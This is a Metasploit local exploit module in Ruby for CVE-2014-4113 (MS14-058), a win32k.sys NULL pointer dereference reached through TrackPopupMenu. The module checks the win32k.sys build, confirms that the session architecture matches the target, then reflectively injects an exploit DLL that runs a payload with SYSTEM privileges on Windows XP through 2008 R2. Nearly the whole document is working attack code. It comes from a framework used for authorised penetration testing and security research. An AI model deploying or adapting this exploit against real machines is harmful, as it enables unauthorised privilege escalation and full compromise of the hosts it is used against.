##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'Windows TrackPopupMenu Win32k NULL Pointer Dereference',
          'Description' => %q{
            This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability
            can be triggered through the use of TrackPopupMenu. Under special conditions, the
            NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary
            code execution. This module has been tested successfully on Windows XP SP3, Windows
            2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows
            2008 R2 SP1 64 bits.
          },
          'License' => MSF_LICENSE,
          'Author' => [
            'Unknown', # vulnerability discovery and exploit in the wild
            'juan vazquez', # msf module (x86 target)
            'Spencer McIntyre', # msf module (x64 target)
            'OJ Reeves <oj[at]buffered.io>'
          ],
          'Arch' => [ ARCH_X86, ARCH_X64 ],
          'Platform' => 'win',
          'SessionTypes' => [ 'meterpreter' ],
          'DefaultOptions' => {
            'EXITFUNC' => 'thread'
          },
          'Targets' => [
            # Tested on (32 bits):
            # * Windows XP SP3
            # * Windows 2003 SP2
            # * Windows 7 SP1
            # * Windows 2008
            [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
            # Tested on (64 bits):
            # * Windows 7 SP1
            # * Windows 2008 R2 SP1
            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
          ],
          'Payload' => {
            'Space' => 4096,
            'DisableNops' => true
          },
          'References' => [
            ['CVE', '2014-4113'],
            ['OSVDB', '113167'],
            ['BID', '70364'],
            ['MSB', 'MS14-058'],
            ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/']
          ],
          'DisclosureDate' => '2014-10-14',
          'DefaultTarget' => 0,
          'Notes' => {
            'Stability' => [ CRASH_OS_RESTARTS, ]
          }
        }
      )
    )
  end

  def check
    if session.platform != 'windows'
      # Non-Windows systems are definitely not affected.
      return Exploit::CheckCode::Safe
    end

    file_path = expand_path('%windir%') << '\\system32\\win32k.sys'
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    # Neither target suports Windows 8 or 8.1
    return Exploit::CheckCode::Safe if build == 9200
    return Exploit::CheckCode::Safe if build == 9600

    return Exploit::CheckCode::Appears if [2600, 3790, 7600, 7601].include?(build)

    return Exploit::CheckCode::Unknown
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
    end

    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Reflectively injecting the exploit DLL and triggering the exploit...')
    if target.arch.first == ARCH_X86
      dll_file_name = 'cve-2014-4113.x86.dll'
    else
      dll_file_name = 'cve-2014-4113.x64.dll'
    end

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    encoded_payload = payload.encoded
    execute_dll(
      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-4113', dll_file_name),
      encoded_payload
    )

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end
end
